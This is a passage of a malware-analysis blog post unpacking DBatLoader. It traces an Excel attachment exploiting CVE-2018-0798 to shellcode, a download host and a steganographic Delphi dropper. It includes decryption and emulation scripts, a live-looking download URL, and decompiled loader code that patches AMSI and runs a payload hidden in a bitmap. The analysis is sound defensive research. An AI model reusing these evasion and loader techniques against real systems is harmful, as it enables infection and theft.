<!DOCTYPE html>

<html lang="en">
<head>
<link href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.css" rel="stylesheet"/>
<title>Exploit, steganography and Delphi: unpacking DBatLoader </title>
<!-- Meta -->
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="We will unroll a maldoc spam exploiting CVE-2018-0798 leading to a multi-staged Delphi dropper abusing steganography and cloud services to conceal its payload" name="description"/>
<meta content="Malcat EI" name="author"/>
<link href="https://malcat.fr/favicon.ico" rel="shortcut icon"/>
<meta content="Exploit, steganography and Delphi: unpacking DBatLoader" property="og:title"/>
<meta content="article" property="og:type">
<meta content="We will unroll a maldoc spam exploiting CVE-2018-0798 leading to a multi-staged Delphi dropper abusing steganography and cloud services to conceal its payload" property="og:description"/>
<meta content="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/bbtrex.png" property="og:image"/>
<meta content="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/" property="og:url"/>
<meta content="summary_large_image" name="twitter:card"/>
<meta content="MALCAT" property="og:site_name"/>
<meta content="@malcat4ever" name="twitter:site"/>
<meta content="@malcat4ever" name="twitter:creator"/>
<!-- FontAwesome JS -->
<link href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" rel="stylesheet">
<link href="https://malcat.fr/theme/plugins/tiny-slider/tiny-slider.css" rel="stylesheet">
<!--<script defer src="https://malcat.fr/theme/fontawesome/js/all.js"></script>-->
<link href="https://malcat.fr/theme/fontawesome/css/all.min.css" rel="stylesheet"/>
<!-- Javascript -->
<script src="https://malcat.fr/theme/plugins/jquery-3.4.1.min.js"></script>
<script src="https://malcat.fr/theme/plugins/popper.min.js"></script>
<script src="https://malcat.fr/theme/plugins/bootstrap/js/bootstrap.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script src="https://malcat.fr/theme/plugins/tiny-slider/min/tiny-slider.js"></script>
<!-- Plugin CSS -->
<link href="https://malcat.fr/theme/plugins/tiny-slider/tiny-slider.css" rel="stylesheet"/>
<!-- Theme CSS -->
<link href="https://malcat.fr/theme/css/theme.css" id="theme-style" rel="stylesheet"/>
<link href="https://malcat.fr/theme/css/extra.css" id="theme-style" rel="stylesheet"/>
<link href="https://malcat.fr/theme/css/pygment.css" id="theme-style" rel="stylesheet"/>
<!-- Feeds -->
<link href="https://malcat.fr/rss.xml" rel="alternate" title="MALCAT Full RSS Feed" type="application/rss+xml">
</link></link></link></meta><link href="https://malcat.fr\blog/exploit-steganography-and-delphi-unpacking-dbatloader/" rel="canonical"/><script type="application/ld+json">{"@context": "https://schema.org", "@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "MALCAT", "item": "https://malcat.fr"}, {"@type": "ListItem", "position": 2, "name": "Blog", "item": "https://malcat.fr\\blog"}, {"@type": "ListItem", "position": 3, "name": "Exploit steganography and delphi unpacking dbatloader", "item": "https://malcat.fr\\blog/exploit-steganography-and-delphi-unpacking-dbatloader"}, {"@type": "ListItem", "position": 4, "name": "Index", "item": "https://malcat.fr\\blog/exploit-steganography-and-delphi-unpacking-dbatloader/index.html"}]}</script><script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "author": {"@type": "Person", "name": "malcat team"}, "publisher": {"@type": "Organization", "name": "MALCAT"}, "headline": "Exploit, steganography and Delphi: unpacking DBatLoader", "about": "malware analysis", "datePublished": "2021-12-07 00:00"}</script></head>
<body>
<header class="header text-center">
<div class="wrapper force-overflow">
<nav class="navbar navbar-expand-lg navbar-dark" id="sidebar">
<button aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-target="#navigation" data-toggle="collapse" type="button">
<span class="navbar-toggler-icon"></span>
</button>
<div class="collapse navbar-collapse flex-column" id="navigation">
<div class="sidebar-header profile-section pt-3 pt-lg-0">
<a href="https://malcat.fr"><img alt="logo" class="profile-image mb-3 mx-auto" src="https://malcat.fr/theme/images/malcat.png"/></a>
<div class="bio mb-3">MALCATÂ -Â the binary file dissector</div>
</div>
<ul class="list-unstyled components">
<li class="nav-item">
<a class="nav-link" href="https://malcat.fr/index.html">The software</a>
</li>
<li class="nav-item">
<a class="nav-link" href="https://malcat.fr/features.html">Features &amp; roadmap</a>
</li>
<li class="nav-item">
<a class="nav-link" href="https://malcat.fr/download.html">Download</a>
</li>
<li class="nav-item">
<a class="nav-link" href="https://malcat.fr/about-us.html">About</a>
</li>
<li class="nav-item">
<a class="nav-link" href="https://doc.malcat.fr">User manual</a>
</li>
<li class="nav-item active">
<a class="nav-link" href="https://malcat.fr/blog.html">Blog</a>
</li>
</ul>
<div class="toc-container">
<div class="pb-3"></div>
<span>Table of contents</span>
<nav class="toc js-toc"></nav>
<div class="pb-3"></div>
</div>
</div>
</nav>
</div><!--//force-overflow-->
</header>
<div class="main-wrapper">
<section class="theme-bg-light">
<div class="container single-col-max-width">
<header class="blog-post-header">
<h1 class="title mb-3 theme-bg-light">Exploit, steganography and Delphi: unpacking DBatLoader</h1>
<div class="meta mb-3">
<span class="date"><i class="fa fa-calendar"></i>Tue 07 December 2021</span>
<span class="date"><i class="fa fa-user"></i><a href="https://malcat.fr/author/malcat-team.html">malcat team</a></span>
<span class="date"><i class="fa fa-tags"></i><a href="https://malcat.fr/category/malware-analysis.html">malware analysis</a>, <a href="https://malcat.fr/category/exploit.html">exploit</a>, <a href="https://malcat.fr/category/unpacking.html">unpacking</a>, <a href="https://malcat.fr/category/emulation.html">emulation</a>, <a href="https://malcat.fr/category/dbatloader.html">dbatloader</a></span>
</div>
</header>
</div>
</section>
<section class="latest-blog-section p-3 p-lg-5">
<article class="blog-post px-3 py-5 p-md-5">
<div class="blog-post-body js-toc-content container single-col-max-width">
<dl class="row">
<dt class="col-sm-3 theme-bg-light mb-1">Sample:</dt>
<dd class="col-sm-9">13063a496da7e490f35ebb4f24a138db4551d48a1d82c0c876906a03b8e83e05 (<a href="https://bazaar.abuse.ch/sample/13063a496da7e490f35ebb4f24a138db4551d48a1d82c0c876906a03b8e83e05/">Bazaar</a>, <a href="https://www.virustotal.com/gui/file/13063a496da7e490f35ebb4f24a138db4551d48a1d82c0c876906a03b8e83e05">VT</a>)</dd>
<dt class="col-sm-3 theme-bg-light mb-1">Infection chain:</dt>
<dd class="col-sm-9">Excel stylesheet -&gt; Office equation -&gt; Shellcode (downloader) -&gt; DBatLoader stage 1 (stegano dropper) -&gt; DBatLoader stage 2 (discord downloader) -&gt; DBatLoader stage 3 (resource dropper) -&gt; Stone packed -&gt; Formbook</dd>
<dt class="col-sm-3 theme-bg-light mb-1">Tools used:</dt>
<dd class="col-sm-9"><a href="https://malcat.fr">Malcat</a>, <a href="https://github.com/mandiant/speakeasy">Speakeasy emulator</a>, <a href="https://hex-rays.com/">Hex Rays</a></dd>
<dt class="col-sm-3 theme-bg-light mb-1">Difficulty:</dt>
<dd class="col-sm-9">Intermediate</dd>
</dl>
<h1 id="introduction">Introduction</h1>
<p>If you are doing cyber threat research on the internet, chances are you will find a ton of papers documenting malicious RATs, APTs and state-sponsored campaigns. It is indeed interesting (and it makes cyber security folks feel like James Bond), but sadly little attention is given to what makes most of the threat landscape: the packers, droppers and other downloaders at the front of the infection chain. They may be less sophisticated, but it is what the user first encounters, and what makes most of the threat landscape. </p>
<p>The truth is, if an antivirus successfully detects and blocks an advanced RAT on a system, it means that it already failed and that the system is compromised, because advanced RAT are at the end of the infection chain. </p>
<p>To illustrate our point, we will inspect a Formbook sample and we won't talk about Formbook at all. Instead we will dissect the infection chain which leads to the installation of Formbook. As you will see, it is actually more complex than one might think.</p>
<h1 id="exploiting-cve-2018-0798">Exploiting CVE-2018-0798</h1>
<h2 id="excel-document">Excel document</h2>
<p>The malware we are analyzing today is an encrypted OpenXML Excel document that came as email attachment. OpenXML documents are usually just ZIP archives containing XML files and are easy to analyze, but not encrypted documents like this one. 
In fact, when a user chose to protect its Excel sheet, Microsoft Excel will encrypt it (using the magical password <code>VelvetSweatshop</code>) and store it inside an OLE container. And when the user opens the document, Office will transparently decrypt it without any user interaction. 
Malware authors are well aware of that fact and tend to abuse Excel encryption in order to <a href="https://blogs.vmware.com/networkvirtualization/2020/11/velvetsweatshop-when-default-passwords-can-still-make-a-difference.html/">evade antivirus detection</a>. 
Fortunately, this is an old technique and tools exist to decrypt this kind of files. In fact, it is as simple as a few lines of python:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">import</span> <span class="nn">msoffcrypto</span>
<span class="sd">"""</span>
<span class="sd">NOTE: for this script to work, you will have to install msoffcrypto: pip3 install msoffcrypto-tool</span>
<span class="sd">"""</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"13063a496da7e490f35ebb4f24a138db4551d48a1d82c0c876906a03b8e83e05.xlsx"</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f_in</span><span class="p">:</span>
    <span class="n">doc</span> <span class="o">=</span> <span class="n">msoffcrypto</span><span class="o">.</span><span class="n">OfficeFile</span><span class="p">(</span><span class="n">f_in</span><span class="p">)</span>
    <span class="n">doc</span><span class="o">.</span><span class="n">load_key</span><span class="p">(</span><span class="n">password</span><span class="o">=</span><span class="s2">"VelvetSweatshop"</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"file0_stage0.xlsx.dec"</span><span class="p">,</span> <span class="s2">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f_out</span><span class="p">:</span>
        <span class="n">doc</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">f_out</span><span class="p">)</span>
</code></pre></div></td></tr></table></div>
<p>This gives us an OpenXML ZIP archive. Browsing the content, we can see a few things worth of interest:</p>
<ul>
<li>the document contains pictures baiting the user to deactivate safe mode (see screenshot below)</li>
<li>there is no <code>vbaProject.bin</code> file in the archive, meaning no VBA macro</li>
<li>there is no Excel macro sheet</li>
<li>there are two embedded objects: <ul>
<li>a Word document at <code>xl/embeddings/Microsoft_Office_Word_Macro-Enabled_Document1.docm</code></li>
<li>an OLE container at <code>xl/embeddings/oleObject1.bin</code></li>
</ul>
</li>
</ul>
<p>Beside these elements, the document looks pretty clean. The Word document only contains a single picture, but the OLE container seems promising since its doctype GUID is <code>0002CE02-0000-0000-C000-000000000046</code> (Microsoft Equation 3.0 object). Equation objects have seen several vulnerabilities in the past years and are actively exploited in the wild. Let us dive in.</p>
<figure id="format1"><img alt="Excel sheet baiting the user to deactivate safe mode" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/excel_decoy.jpg"> <figcaption>Figure 1: Excel sheet baiting the user to deactivate safe mode</figcaption></img></figure>
<h2 id="buggy-equation">Buggy equation</h2>
<p>If we open the <code>oLE10NATive</code> stream of the OLE container <code>xl/embeddings/oleObject1.bin</code> inside Malcat, we can see a very bare bone Equation 3.0 object which has been stripped to the minimal, leaving just enough to target the exploit. But which exploit?  <a href="https://www.virustotal.com/gui/file/13063a496da7e490f35ebb4f24a138db4551d48a1d82c0c876906a03b8e83e05">VirusTotal</a> tends to detect it as CVE-2017-11882, but not all engines agree. Let us have a look at the data:</p>
<figure id="format2"><img alt="Embedded OLE object" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/stream.png"/> <figcaption>Figure 2: Embedded OLE object</figcaption></figure>
<p>Using the documentation of the MTEF format found <a href="http://rtf2latex2e.sourceforge.net/MTEF3.html">here</a>, we can make sense of most of the stream:</p>
<table class="table table-bordered table-responsive-sm">
<thead>
<tr>
<th class="theme-bg-light">Offset</th>
<th class="theme-bg-light">Size</th>
<th class="theme-bg-light">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td>00</td>
<td>4</td>
<td>The OLE1 header specifying the size of the data in the stream. Office seems to ignore this value and use the stream size from the OLE container instead</td>
</tr>
<tr>
<td>04</td>
<td>5</td>
<td>MTEF header. Only the MTEF version (3) and MTEF product(1 = Equation Editor) seem to have valid values. The rest is most likely ignored by Office and has been randomized.</td>
</tr>
<tr>
<td>09</td>
<td>2</td>
<td>First MTEF record: 0x0A = FULL SIZE record</td>
</tr>
<tr>
<td>0B</td>
<td>6-?</td>
<td>Second MTEF record: 0x05 = MATRIX record</td>
</tr>
</tbody>
</table>
<p>The MATRIX record seem to be the culprit there, and it would mean that we are facing CVE-2018-0798. CVE-2018-0798 is sometimes confused with CVE-2018-0802 since Microsoft originally allocated the same CVE for two different vulnerabilities. But it is quite different from CVE-2017-11882 which exploits the FONT record: funny how most antivirus got it wrong. </p>
<p>According to <a href="http://ith4cker.com/content/uploadfile/201801/bd671515949243.pdf">this document</a>, the MATRIX record triggers the exploit by setting the field <code>NumberOfRows</code> too high. Only 8 bytes are reserved in eqnedt32.exe for the array <code>RowPartitionLineTypes</code>, but (2 * 0xec + 9) / 8 = 0x3c bytes are copied instead, leading to a stack overflow:</p>
<figure id="format3"><img alt="The equation object explained" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/exploit.png"/> <figcaption>Figure 3: The equation object explained</figcaption></figure>
<p>Knowing this, we can now start looking for a shellcode.</p>
<h2 id="the-shellcode">The shellcode</h2>
<p>By quickly inspecting what follows the MATRIX record (so starting at offset 0x4D), we notice that offset 0x50 looks like the start of a shellcode. Indeed, the push/pop/jmp chain tends to indicate a meterpreter-generated shellcode. </p>
<figure id="format4"><img alt="meterpreter-generated shellcode are easy to spot" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/shellcode.png"/> <figcaption>Figure 4: meterpreter-generated shellcode are easy to spot</figcaption></figure>
<p>Judging by the high entropy of the rest of the stream, the shellcode is most likely encrypted. We could of course reverse it, but it is faster to emulate the code. We will use the <a href="https://github.com/mandiant/speakeasy">Speakeasy emulator</a> from FireEye on the content of the <code>oLE10NATive</code> stream. You can use the following script:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">import</span> <span class="nn">speakeasy</span>
<span class="kn">import</span> <span class="nn">speakeasy.winenv.arch</span> <span class="k">as</span> <span class="nn">e_arch</span>

<span class="n">unpacker</span> <span class="o">=</span> <span class="n">speakeasy</span><span class="o">.</span><span class="n">Speakeasy</span><span class="p">()</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"olenative10_stream.bin"</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">ole10native</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">ole10native</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">address</span> <span class="o">=</span> <span class="n">unpacker</span><span class="o">.</span><span class="n">load_shellcode</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span> <span class="n">e_arch</span><span class="o">.</span><span class="n">ARCH_X86</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="n">unpacker</span><span class="o">.</span><span class="n">run_shellcode</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span>   <span class="c1"># shellcode starts at offset 0x50</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"shellcode_decrypted.bin"</span><span class="p">,</span> <span class="s2">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">unpacker</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
</code></pre></div></td></tr></table></div>
<p>If you are using <a href="https://malcat.fr">Malcat</a>, you can alternatively force a function declaration at offset 0x50 (start of the shellcode) and then run the script <code>speakeasy_shellcode.py</code>. The shellcode gets decrypted and strings are now in plain text:</p>
<figure id="format5"><img alt="Decrypting the shellcode with speakeasy" class="gif" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/shellcode.gif"/> <figcaption>Figure 5: Decrypting the shellcode with speakeasy</figcaption></figure>
<p>No need to analyze the shellcode in depth. Judging by the strings, it is a simple downloader that fetches and runs a file from the url <code>hxxp://104.168.32.50/009/vbc.exe</code> (still online at time of writing). So let us fetch the data and move on.</p>
<h1 id="first-stage-a-bit-of-steganography">First stage: a bit of steganography</h1>
<p>The file <code>vbc.exe</code> is a 937KB Delphi application of sha256 3045902d7104e67ca88ca54360d9ef5bfe5bec8b575580bc28205ca67eeba96d (<a href="https://bazaar.abuse.ch/sample/3045902d7104e67ca88ca54360d9ef5bfe5bec8b575580bc28205ca67eeba96d/">Bazaar</a>, <a href="https://www.virustotal.com/gui/file/3045902d7104e67ca88ca54360d9ef5bfe5bec8b575580bc28205ca67eeba96d">VT</a>). Because of its size, reversing the complete application is out of question. We could send it to a sandbox, but our goal is to analyze and <em>understand</em> the dropper. So let us try to locate the payload instead by looking at anomalies.</p>
<h2 id="locating-the-payload">Locating the payload</h2>
<p>Sweeping quickly through the binary, we find two points of interest:</p>
<ul>
<li>
<p>A huge string (104427 bytes) at address <code>0x0046f718</code></p>
</li>
<li>
<p>A resource bitmap named <code>BBTREX</code> which does not look like the standard one (size is different, resource language too). Visually, the resource is a picture and definitely not an icon like the rest. It has most likely been patched post-compilation.</p>
</li>
</ul>
<figure id="format6"><img alt="Weird bitmap resource BBTREX" class="photo" src="https://malcat.fr/blog/exploit-steganography-and-delphi-unpacking-dbatloader/bbtrex.png"/> <figcaption>Figure 6: Weird bitmap resource BBTREX</figcaption></figure>
<p>These two objects are referenced by the same function at offset <code>0x46D330</code>, which is quite convenient. This function is located near the end of the CODE section, which is also of importance. Delphi application are structured in Units, and the linker tends to put library units at the start of the code section, and user units at the end. So everything at the end of the CODE section is likely to be user code and thus interesting. Let us have a look at the function using HexRays:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">#! cpp</span>
<span class="kt">int</span><span class="w"> </span><span class="nf">DropAndRun</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">   </span><span class="c1">// 46D330  </span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">v0</span><span class="p">;</span><span class="w"> </span><span class="c1">// eax</span>
<span class="w">  </span><span class="n">DWORD</span><span class="w"> </span><span class="n">v3</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp-18h] [ebp-20h]</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">v4</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp-14h] [ebp-1Ch]</span>
<span class="w">  </span><span class="n">LPURL_COMPONENTS</span><span class="w"> </span><span class="n">v5</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp-10h] [ebp-18h]</span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">v6</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp-Ch] [ebp-14h]</span>
<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">v7</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp-4h] [ebp-Ch]</span>
<span class="w">  </span><span class="kr">__int32</span><span class="w"> </span><span class="n">unpacked_bitmap</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+0h] [ebp-8h] BYREF</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">v9</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+4h] [ebp-4h] BYREF</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">savedregs</span><span class="p">;</span><span class="w"> </span><span class="c1">// [esp+8h] [ebp+0h] BYREF</span>

<span class="w">  </span><span class="n">TimeGetTickCount</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
<span class="w">  </span><span class="n">sub_406F00</span><span class="p">(</span><span class="n">dword_48ACB0</span><span class="p">,</span><span class="w"> </span><span class="n">dword_48AD7C</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">InetIsOffline</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
<span class="w">    </span><span class="n">System</span><span class="o">::</span><span class="n">__linkproc__</span><span class="w"> </span><span class="n">LStrAsg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">str_A</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">  </span><span class="k">else</span>
<span class="w">    </span><span class="n">System</span><span class="o">::</span><span class="n">__linkproc__</span><span class="w"> </span><span class="n">LStrAsg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">str_a</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">  </span><span class="n">System</span><span class="o">::</span><span class="n">__linkproc__</span><span class="w"> </span><span class="n">LStrCatN</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v9</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">);</span>
<span class="w">  </span><span class="n">GetApiAddress</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">str_RasClearLinkSta</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">p_RasClearLinkStatistics</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">dword_48ACC0</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mh">0x87A68E</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// always true</span>
<span class="w">    </span><span class="n">GetApiAddress</span><span class="p">(</span><span class="o">&amp;</span><span class="n">str_amsi</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">str_amsiamsiScanBuf</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">p_amsiScanBuffer</span><span class="p">);</span>
<span class="w">    </span><span class="n">Patch</span><span class="p">(</span><span class="n">p_amsiScanBuffer</span><span class="p">,</span><span class="w"> </span><span class="n">WinHttpCrackUrl</span><span class="p">);</span>
<span class="w">    </span><span class="n">bitmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Graphics</span><span class="o">::</span><span class="n">TBitmap</span><span class="o">::</span><span class="n">TBitmap</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cls_Graphics_TBitmap</span><span class="p">);</span>
<span class="w">    </span><span class="n">LoadResourceIntoBitmap</span><span class="p">(</span><span class="n">bitmap</span><span class="p">,</span><span class="w"> </span><span class="n">Y</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">str_BBTREX</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="c1">// load resource bitmap BBTREX</span>
<span class="w">    </span><span class="n">SteganoUnpack</span><span class="p">(</span><span class="n">bitmap</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">unpacked_bitmap</span><span class="p">);</span><span class="w">    </span><span class="c1">// extract payload from bitmap</span>
<span class="w">    </span><span class="n">System</span><span class="o">::</span><span class="n">__linkproc__</span><span class="w"> </span><span class="n">LStrAsg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="n">unpacked_bitmap</span><span class="p">);</span>
<span class="w">    </span><span class="n">RunPayload</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span><span class="w">                        </span><span class="c1">// run payload in memory</span>
<span class="w">    </span><span class="n">v0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">j_unknown_libname_57_0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dword_48AD44</span><span class="p">);</span>
<span class="w">    </span><span class="n">System</span><span class="o">::</span><span class="n">Move</span><span class="p">(</span><span class="n">aGlojdxoscdjtlq</span><span class="p">,</span><span class="w"> </span><span class="n">v0</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w">   </span><span class="c1">// append very long string in memory</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// call WinHttpCrackUrl and exits</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">__writefsdword</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">v6</span><span class="p">);</span>
<span class="w">  </span><span class="n">v7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">loc_46D4A5</span><span class="p">;</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">System</span><span class="o">::</span><span class="n">__linkproc__</span><span class="w"> </span><span class="n">LStrArrayClr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unpacked_bitmap</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<p>The function <code>RunPayload</code> at address <code>0x46cdf0</code> makes use of <code>VirtualAlloc</code> and <code>VirtualProtect</code>, which suggests that at this point the dropper already decrypted its payload. And just before the call, we can see that the program loads the patched bitmap resource <code>BBTREX</code> into a <code>TBitmap</code> and calls the function that we named <code>SteganoUnpack</code>. So let us have a look at <code>SteganoUnpack</code>.</p>
<h2 id="decrypting-the-bitmap">Decrypting the bitmap</h2>
<p>The function <code>SteganoUnpack</code> at address <code>0x46C8F8</code> is a bit harder to understand. But using IDA's Delphi FLIRT signatures, we can get most of it:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
